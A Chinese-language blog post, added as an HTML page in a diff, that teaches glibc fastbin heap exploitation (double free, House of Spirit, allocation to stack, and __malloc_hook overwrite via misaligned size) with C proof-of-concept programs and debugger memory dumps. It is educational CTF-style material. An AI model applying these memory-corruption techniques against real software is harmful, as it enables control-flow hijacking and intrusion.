@@ -1,0 +1,433 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN" class="loading">
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Fastbin Attack - gravity的个人博客</title>
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate">
+    <meta name="keywords" content="GraVity0,"> 
+    <meta name="description" content="介绍：fastbin attack 是一类漏洞的利用方法，是指所有基于 fastbin 机制的漏洞利用方法。这类利用的前提是：        
+
+1.存在堆溢出、use-after-free等能控制,"> 
+    <meta name="author" content="yuntao you"> 
+    <link rel="alternative" href="atom.xml" title="gravity的个人博客" type="application/atom+xml"> 
+    <link rel="icon" href="/img/first.jpg"> 
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+    <link rel="stylesheet" href="/css/diaspora.css">
+    <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads" src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+</head>
+</html>
+<body class="loading">
+    <span id="config-title" style="display:none">gravity的个人博客</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="icon-home image-icon" href="javascript:;" data-url="http://yoursite.com"></a>
+    <div title="播放/暂停" class="icon-play"></div>
+    <h3 class="subtitle">Fastbin Attack</h3>
+    <div class="social">
+        <!--<div class="like-icon">-->
+            <!--<a href="javascript:;" class="likeThis active"><span class="icon-like"></span><span class="count">76</span></a>-->
+        <!--</div>-->
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class="main">
+        <h1 class="title">Fastbin Attack</h1>
+        <div class="stuff">
+            <span>十月 02, 2019</span>
+            
+
+        </div>
+        <div class="content markdown">
+            <h2 id="介绍："><a href="#介绍：" class="headerlink" title="介绍："></a>介绍：</h2><p>fastbin attack 是一类漏洞的利用方法，是指所有基于 fastbin 机制的漏洞利用方法。这类利用的前提是：        </p>
+<ul>
+<li>1.存在堆溢出、use-after-free等能控制chunk内容的漏洞   </li>
+<li>2.漏洞发生于fastbin类型的chunk中     </li>
+</ul>
+<p>可以细分为一下四类：    </p>
+<ul>
+<li>Fastbin Double free</li>
+<li>House of Spirit</li>
+<li>alloc to stack</li>
+<li>Arbitrary Alloc      </li>
+</ul>
+<p>其中，前两种主要漏洞侧重于利用 free 函数释放真的 chunk 或伪造的 chunk，然后再次申请 chunk 进行攻击，后两种侧重于故意修改 fd 指针，直接利用 malloc 申请指定位置 chunk 进行攻击。     </p>
+<h2 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h2><p>fastbin attack 存在的原因在于 fastbin 是使用单链表来维护释放的堆块的，并且由 fastbin 管理的 chunk 即使被释放，其 next_chunk 的 prev_inuse 位也不会被清空。 我们来看一下 fastbin 是怎样管理空闲 chunk 的。      </p>
+<pre><code class="cpp">int main(void)
+{
+    void *chunk1,*chunk2,*chunk3;
+    chunk1=malloc(0x30);
+    chunk2=malloc(0x30);
+    chunk3=malloc(0x30);
+    //进行释放
+    free(chunk1);
+    free(chunk2);
+    free(chunk3);
+    return 0;
+}
+</code></pre>
+<p>释放前：      </p>
+<pre><code class="cpp">0x602000:   0x0000000000000000  0x0000000000000041 &lt;=== chunk1
+0x602010:   0x0000000000000000  0x0000000000000000
+0x602020:   0x0000000000000000  0x0000000000000000
+0x602030:   0x0000000000000000  0x0000000000000000
+0x602040:   0x0000000000000000  0x0000000000000041 &lt;=== chunk2
+0x602050:   0x0000000000000000  0x0000000000000000
+0x602060:   0x0000000000000000  0x0000000000000000
+0x602070:   0x0000000000000000  0x0000000000000000
+0x602080:   0x0000000000000000  0x0000000000000041 &lt;=== chunk3
+0x602090:   0x0000000000000000  0x0000000000000000
+0x6020a0:   0x0000000000000000  0x0000000000000000
+0x6020b0:   0x0000000000000000  0x0000000000000000
+0x6020c0:   0x0000000000000000  0x0000000000020f41 &lt;=== top chunk
+</code></pre>
+<p>执行三次 free 进行释放后        </p>
+<pre><code class="cpp">0x602000:   0x0000000000000000  0x0000000000000041 &lt;=== chunk1
+0x602010:   0x0000000000000000  0x0000000000000000
+0x602020:   0x0000000000000000  0x0000000000000000
+0x602030:   0x0000000000000000  0x0000000000000000
+0x602040:   0x0000000000000000  0x0000000000000041 &lt;=== chunk2
+0x602050:   0x0000000000602000  0x0000000000000000
+0x602060:   0x0000000000000000  0x0000000000000000
+0x602070:   0x0000000000000000  0x0000000000000000
+0x602080:   0x0000000000000000  0x0000000000000041 &lt;=== chunk3
+0x602090:   0x0000000000602040  0x0000000000000000
+0x6020a0:   0x0000000000000000  0x0000000000000000
+0x6020b0:   0x0000000000000000  0x0000000000000000
+0x6020c0:   0x0000000000000000  0x0000000000020f41 &lt;=== top chunk
+</code></pre>
+<p>此时位于 main_arena 中的 fastbin 链表中已经储存了指向 chunk3 的指针，并且 chunk 3、2、1构成了一个单链表          </p>
+<pre><code class="cpp">Fastbins[idx=2, size=0x30,ptr=0x602080]
+===&gt;Chunk(fd=0x602040, size=0x40, flags=PREV_INUSE)
+===&gt;Chunk(fd=0x602000, size=0x40, flags=PREV_INUSE)
+===&gt;Chunk(fd=0x000000, size=0x40, flags=PREV_INUSE) 
+</code></pre>
+<p><img src="https://i.loli.net/2019/10/02/xeBgVo1S2DYuMmh.png" alt="fastbin_link_list.png">        </p>
+<h2 id="Fastbin-Doble-Free"><a href="#Fastbin-Doble-Free" class="headerlink" title="Fastbin Doble Free"></a>Fastbin Doble Free</h2><h6 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h6><p>Fastbin Double Free 是指 fastbin 的 chunk 可以被多次释放，因此可以在 fastbin 链表中存在多次。这样导致的后果是多次分配可以从 fastbin 链表中取出同一个堆块，相当于多个指针指向同一个堆块，结合堆块的数据内容可以实现类似于类型混淆(type confused)的效果。     </p>
+<pre><code class="cpp">int main(void)
+{
+    void *chunk1,*chunk2,*chunk3;
+    chunk1=malloc(0x10);
+    chunk2=malloc(0x10);
+
+    free(chunk1);
+    free(chunk2);
+    free(chunk1);
+    return 0;
+}
+</code></pre>
+<p>这里需要注意一点：如果不在两次free（1）中间穿插free（2）的话，会触发_int_free函数的检测。<br>这里用图示的方式更好理解：<br>第一次释放free（chunk1）：<br><img src="https://i.loli.net/2019/10/02/Gwh39gTdWqMRAJm.png" alt="fastbin_free_chunk1.png"><br>第二次释放free（chunk2）：<br><img src="https://i.loli.net/2019/10/02/DSjnJV3YNvLGgIp.png" alt="fastbin_free_chunk2.png"><br>第三次释放free(chunk1)：<br><img src="https://i.loli.net/2019/10/02/DrigztMmh1f69UF.png" alt="fastbin_free_chunk3.png">     </p>
+<p>注意因为 chunk1 被再次释放因此其 fd 值不再为 0 而是指向 chunk2，这时如果我们可以控制 chunk1 的内容，便可以写入其 fd 指针从而实现在我们想要的任意地址分配 fastbin 块。 下面这个示例演示了这一点，首先跟前面一样构造 main_arena=&gt;chunk1=&gt;chun2=&gt;chunk1的链表。之后第一次调用 malloc 返回 chunk1 之后修改 chunk1 的 fd 指针指向 bss 段上的 bss_chunk，之后我们可以看到 fastbin 会把堆块分配到这里。              </p>
+<pre><code class="cpp">typedef struct _chunk
+{
+    long long pre_size;
+    long long size;
+    long long fd;
+    long long bk;  
+} CHUNK,*PCHUNK;
+
+CHUNK bss_chunk;
+
+int main(void)
+{
+    void *chunk1,*chunk2,*chunk3;
+    void *chunk_a,*chunk_b;
+
+    bss_chunk.size=0x21;
+    chunk1=malloc(0x10);
+    chunk2=malloc(0x10);
+
+    free(chunk1);
+    free(chunk2);
+    free(chunk1);
+
+    chunk_a=malloc(0x10);
+    *(long long *)chunk_a=&amp;bss_chunk;
+    malloc(0x10);
+    malloc(0x10);
+    chunk_b=malloc(0x10);
+    printf(&quot;%p&quot;,chunk_b);
+    return 0;
+}
+</code></pre>
+<p>三次free后的fastbin链表：<br>main_arena.fastbin—&gt;chunk1—&gt;chunk2—&gt;chunk1（注意chunk1的fd也是指向chunk2,即chunk1和chunk2是一个环形链表）<br>之后第一次malloc，分配时从fastbin的首部取出，即chunk_a获得的是chunk1的地址<br>修改chunk_a即修改chunk1的fd位置，把此处修改为全局变量bss_chunk的地址，此时fastbin链表为fastbin—&gt;chunk2—&gt;chunk1—&gt;bss_chunk。<br>经过3次malloc(0x11)，依次从fastbin中取出，此次取出的地址就是我们写入的地址      </p>
+<p>值得注意的是，我们在 main 函数的第一步就进行了bss_chunk.size=0x21;的操作，这是因为_int_malloc会对欲分配位置的 size 域进行验证，如果其 size 与当前 fastbin 链表应有 size 不符就会抛出异常。      </p>
+<p><strong>小总结</strong><br>通过 fastbin double free 我们可以使用多个指针控制同一个堆块，这可以用于篡改一些堆块中的关键数据域或者是实现类似于类型混淆的效果。 如果更进一步修改 fd 指针，则能够实现任意地址分配堆块的效果( 首先要通过验证 )，这就相当于任意地址写任意值的效果。      </p>
+<h2 id="House-Of-Spirit"><a href="#House-Of-Spirit" class="headerlink" title="House Of Spirit"></a>House Of Spirit</h2><p>House of Spirit 是 the Malloc Maleficarum 中的一种技术。      </p>
+<p>该技术的核心在于在目标位置处伪造 fastbin chunk，并将其释放，从而达到分配指定地址的 chunk 的目的。       </p>
+<p>要想构造 fastbin fake chunk，并且将其释放时，可以将其放入到对应的 fastbin 链表中，需要绕过一些必要的检测，即         </p>
+<ul>
+<li>fake chunk 的 ISMMAP 位不能为1，因为 free 时，如果是 mmap 的 chunk，会单独处理。    </li>
+<li>fake chunk 地址需要对齐， MALLOC_ALIGN_MASK    </li>
+<li>fake chunk 的 size 大小需要满足对应的 fastbin 的需求，同时也得对齐。     </li>
+<li>fake chunk 的 next chunk 的大小不能小于 2 * SIZE_SZ，同时也不能大于av-&gt;system_mem 。      </li>
+<li>fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 的情况。      </li>
+</ul>
+<p>这里以how2heap的例子说明：      </p>
+<pre><code class="cpp">int main()
+{
+    malloc(1);//初始化堆空间
+    unsigned long long *a;
+    unsigned long long fake_chunks[10]；    //1
+    fake_chunks[1] = 0x40; //         2
+    fake_chunks[9] = 0x1234; //     3
+    a = &amp;fake_chunks[2];
+    free(a);    //4
+    fprintf(stderr, &quot;malloc(0x30): %p\n&quot;, malloc(0x30));    //5
+}
+</code></pre>
+<p>1.首先需要控制一个伪造的chunk以及相邻chunk的头部（相邻chunk头部有一个长度检测，需要修改来绕过）。这里想伪造的chunk大小为0x40。该伪造chunk大小为0x40+0x10(chunk头部大小)=0x50，相邻的chunk头部大小为0x10。即总的空间为0x50+0x10=0x60=80。刚好是10个long long的大小（long long在64位系统上是8个字节）。<br>2.伪造free的chunk大小<br>3.绕过长度检测（fake chunk 的 next chunk 的大小不能小于 2 * SIZE_SZ，同时也不能大于av-&gt;system_mem）<br>4.free掉fake chunk，放入fastbin<br>5.malloc同样大小的内存，得到该地址。     </p>
+<h2 id="Alloc-to-Stack"><a href="#Alloc-to-Stack" class="headerlink" title="Alloc to Stack"></a>Alloc to Stack</h2><p>介绍<br>如果你已经理解了前文所讲的 Fastbin Double Free 与 house of spirit 技术，那么理解该技术就已经不成问题了，它们的本质都在于 fastbin 链表的特性：当前 chunk 的 fd 指针指向下一个 chunk。   </p>
+<p>该技术的核心点在于劫持 fastbin 链表中 chunk 的 fd 指针，把 fd 指针指向我们想要分配的栈上，从而实现控制栈中的一些关键数据，比如返回地址等。     </p>
+<p>这次我们把 fake_chunk 置于栈中称为 stack_chunk，同时劫持了 fastbin 链表中 chunk 的 fd 值，通过把这个 fd 值指向 stack_chunk 就可以实现在栈中分配 fastbin chunk。      </p>
+<pre><code class="cpp">typedef struct _chunk
+{
+    long long pre_size;
+    long long size;
+    long long fd;
+    long long bk;  
+} CHUNK,*PCHUNK;
+
+int main(void)
+{
+    CHUNK stack_chunk;
+
+    void *chunk1;
+    void *chunk_a;
+
+    stack_chunk.size=0x21;
+    chunk1=malloc(0x10);
+
+    free(chunk1);
+
+    *(long long *)chunk1=&amp;stack_chunk;
+    malloc(0x10);
+    chunk_a=malloc(0x10);
+    return 0;
+}
+</code></pre>
+<p>首先把chunk1的fd指针指向了stack_chunk     </p>
+<pre><code class="cpp">0x602000:   0x0000000000000000  0x0000000000000021 &lt;=== chunk1
+0x602010:   0x00007fffffffde60  0x0000000000000000
+0x602020:   0x0000000000000000  0x0000000000020fe1 &lt;=== top chunk
+</code></pre>
+<p>之后第一次 malloc 使得 fastbin 链表指向了 stack_chunk，这意味着下一次分配会使用 stack_chunk 的内存进行     </p>
+<pre><code class="cpp">0x7ffff7dd1b20 &lt;main_arena&gt;:    0x0000000000000000 &lt;=== unsorted bin
+0x7ffff7dd1b28 &lt;main_arena+8&gt;:  0x00007fffffffde60 &lt;=== fastbin[0]
+0x7ffff7dd1b30 &lt;main_arena+16&gt;: 0x0000000000000000  
+</code></pre>
+<p>最终第二次malloc返回值为0x00007fffffffde70也就是stack_chunk    </p>
+<pre><code class="cpp">   0x400629 &lt;main+83&gt;        call   0x4004c0 &lt;malloc@plt&gt;
+ → 0x40062e &lt;main+88&gt;        mov    QWORD PTR [rbp-0x38], rax
+   $rax   : 0x00007fffffffde70
+
+0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/Ox9A82/tst/tst
+0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/Ox9A82/tst/tst
+0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/Ox9A82/tst/tst
+0x0000000000602000 0x0000000000623000 0x0000000000000000 rw- [heap]
+0x00007ffff7a0d000 0x00007ffff7bcd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so
+0x00007ffff7bcd000 0x00007ffff7dcd000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so
+0x00007ffff7dcd000 0x00007ffff7dd1000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so
+0x00007ffff7dd1000 0x00007ffff7dd3000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so
+0x00007ffff7dd3000 0x00007ffff7dd7000 0x0000000000000000 rw- 
+0x00007ffff7dd7000 0x00007ffff7dfd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.23.so
+0x00007ffff7fdb000 0x00007ffff7fde000 0x0000000000000000 rw- 
+0x00007ffff7ff6000 0x00007ffff7ff8000 0x0000000000000000 rw- 
+0x00007ffff7ff8000 0x00007ffff7ffa000 0x0000000000000000 r-- [vvar]
+0x00007ffff7ffa000 0x00007ffff7ffc000 0x0000000000000000 r-x [vdso]
+0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000025000 r-- /lib/x86_64-linux-gnu/ld-2.23.so
+0x00007ffff7ffd000 0x00007ffff7ffe000 0x0000000000026000 rw- /lib/x86_64-linux-gnu/ld-2.23.so
+0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw- 
+0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
+0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
+</code></pre>
+<p><strong>小总结</strong><br>通过该技术我们可以把 fastbin chunk 分配到栈中，从而控制返回地址等关键数据。要实现这一点我们需要劫持fastbin 中 chunk 的 fd 域，把它指到栈上，当然同时需要栈上存在有满足条件的size值。     </p>
+<h2 id="Arbitrary-Alloc"><a href="#Arbitrary-Alloc" class="headerlink" title="Arbitrary Alloc"></a>Arbitrary Alloc</h2><p>介绍<br>Arbitrary Alloc 其实与 Alloc to stack 是完全相同的，唯一的区别是分配的目标不再是栈中。 事实上只要满足目标地址存在合法的 size 域（这个 size 域是构造的，还是自然存在的都无妨），我们可以把 chunk 分配到任意的可写内存中，比如bss、heap、data、stack等等。<br>演示：<br>在这个例子，我们使用字节错位来实现直接分配 fastbin 到_malloc_hook的位置，相当于覆盖_malloc_hook来控制程序流程。       </p>
+<pre><code class="cpp">int main(void)
+{
+
+
+    void *chunk1;
+    void *chunk_a;
+
+    chunk1=malloc(0x60);
+
+    free(chunk1);
+
+    *(long long *)chunk1=0x7ffff7dd1af5-0x8;
+    malloc(0x60);
+    chunk_a=malloc(0x60);
+    return 0;
+}
+</code></pre>
+<p>这里的0x7ffff7dd1af5是我根据本机的情况得出的值，这个值是怎么获得的呢？首先我们要观察欲写入地址附近是否存在可以字节错位的情况。    </p>
+<pre><code class="cpp">0x7ffff7dd1a88 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
+0x7ffff7dd1a90 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
+0x7ffff7dd1a98 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
+0x7ffff7dd1aa0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
+0x7ffff7dd1aa8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
+0x7ffff7dd1ab0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
+0x7ffff7dd1ab8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
+0x7ffff7dd1ac0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
+0x7ffff7dd1ac8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
+0x7ffff7dd1ad0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
+0x7ffff7dd1ad8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
+0x7ffff7dd1ae0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
+0x7ffff7dd1ae8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
+0x7ffff7dd1af0 0x60 0x2 0xdd 0xf7 0xff 0x7f 0x0 0x0
+0x7ffff7dd1af8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
+0x7ffff7dd1b00 0x20 0x2e 0xa9 0xf7 0xff 0x7f 0x0 0x0
+0x7ffff7dd1b08 0x0  0x2a 0xa9 0xf7 0xff 0x7f 0x0 0x0
+0x7ffff7dd1b10 &lt;__malloc_hook&gt;: 0x30    0x28    0xa9    0xf7    0xff    0x7f    0x0 0x0
+</code></pre>
+<p>0x7ffff7dd1b10 是我们想要控制的__malloc_hook 的地址，于是我们向上寻找是否可以错位出一个合法的size域。因为这个程序是 64 位的，因此 fastbin 的范围为32字节到128字节(0x20-0x80)，如下：    </p>
+<pre><code class="cpp">//这里的size指用户区域，因此要小2倍SIZE_SZ
+Fastbins[idx=0, size=0x10] 
+Fastbins[idx=1, size=0x20] 
+Fastbins[idx=2, size=0x30] 
+Fastbins[idx=3, size=0x40] 
+Fastbins[idx=4, size=0x50] 
+Fastbins[idx=5, size=0x60] 
+Fastbins[idx=6, size=0x70] 
+</code></pre>
+<p>通过观察发现 0x7ffff7dd1af5 处可以现实错位构造出一个0x000000000000007f       </p>
+<pre><code class="cpp">0x7ffff7dd1af0 0x60 0x2 0xdd 0xf7 0xff 0x7f 0x0 0x0
+0x7ffff7dd1af8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
+
+0x7ffff7dd1af5 &lt;_IO_wide_data_0+309&gt;:   0x000000000000007f
+</code></pre>
+<p>因为 0x7f 在计算 fastbin index 时，是属于 index 5 的，即 chunk 大小为 0x70 的。         </p>
+<pre><code class="cpp">##define fastbin_index(sz)                                                      \
+    ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)
+</code></pre>
+<p>（注意sz的大小是unsigned int，因此只占4个字节）<br>而其大小又包含了 0x10 的 chunk_header，因此我们选择分配 0x60 的 fastbin，将其加入链表。 最后经过两次分配可以观察到 chunk 被分配到 0x7ffff7dd1afd，因此我们就可以直接控制 malloc_hook的内容(在我的libc中realloc_hook与__malloc_hook是在连在一起的)。       </p>
+<pre><code class="cpp">0x4005a8 &lt;main+66&gt;        call   0x400450 &lt;malloc@plt&gt;
+ →   0x4005ad &lt;main+71&gt;        mov    QWORD PTR [rbp-0x8], rax
+
+ $rax   : 0x7ffff7dd1afd 
+
+0x7ffff7dd1aed &lt;_IO_wide_data_0+301&gt;:   0xfff7dd0260000000  0x000000000000007f
+0x7ffff7dd1afd: 0xfff7a92e20000000  0xfff7a92a0000007f
+0x7ffff7dd1b0d &lt;__realloc_hook+5&gt;:  0x000000000000007f  0x0000000000000000
+0x7ffff7dd1b1d: 0x0000000000000000  0x0000000000000000
+</code></pre>
+<p><strong>小总结</strong><br>Arbitrary Alloc 在 CTF 中用地更加频繁。我们可以利用字节错位等方法来绕过 size 域的检验，实现任意地址分配 chunk，最后的效果也就相当于任意地址写任意值。       </p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title="0" data-url="http://link.hhtjim.com/163/5146554.mp3"></li>
+                        
+                    
+                        
+                            <li title="1" data-url="http://link.hhtjim.com/qq/001faIUs4M2zna.mp3"></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id="gitalk-container" class="comment link" data-ae="false" data-ci="" data-cs="" data-r="" data-o="" data-a="" data-d="false">查看评论</div>
+
+
+    </div>
+    
+        <div class="side">
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#介绍："><span class="toc-number">1.</span> <span class="toc-text">介绍：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#原理："><span class="toc-number">2.</span> <span class="toc-text">原理：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Fastbin-Doble-Free"><span class="toc-number">3.</span> <span class="toc-text">Fastbin Doble Free</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#介绍"><span class="toc-number">3.0.0.0.1.</span> <span class="toc-text">介绍</span></a></li></ol></li></ol><li class="toc-item toc-level-2"><a class="toc-link" href="#House-Of-Spirit"><span class="toc-number">4.</span> <span class="toc-text">House Of Spirit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Alloc-to-Stack"><span class="toc-number">5.</span> <span class="toc-text">Alloc to Stack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Arbitrary-Alloc"><span class="toc-number">6.</span> <span class="toc-text">Arbitrary Alloc</span></a></li>
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/nito.model.json"},"display":{"position":"lift","width":200,"height":350},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/diaspora.js"></script>
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+</html>
